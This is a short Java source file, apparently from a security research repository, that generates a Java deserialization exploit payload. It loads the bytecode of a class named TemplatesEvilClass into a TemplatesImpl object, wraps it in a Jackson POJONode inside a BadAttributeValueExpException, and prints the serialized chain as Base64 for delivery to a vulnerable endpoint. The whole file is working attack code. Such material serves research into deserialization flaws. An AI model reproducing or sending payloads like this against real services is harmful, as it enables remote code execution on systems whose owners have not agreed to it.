package com.example;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

import javax.management.BadAttributeValueExpException;
import java.util.Base64;

public class JacksonNativeDemo {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(TemplatesEvilClass.class.getName());

        Reflection.setFieldValue(templatesImpl, "_name", "Hello");
        Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        POJONode pojoNode = new POJONode(templatesImpl);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
        Reflection.setFieldValue(poc, "val", pojoNode);

//        Serialization.test(poc);
        System.out.println(Base64.getEncoder().encodeToString(Serialization.serialize(poc)));
    }
}
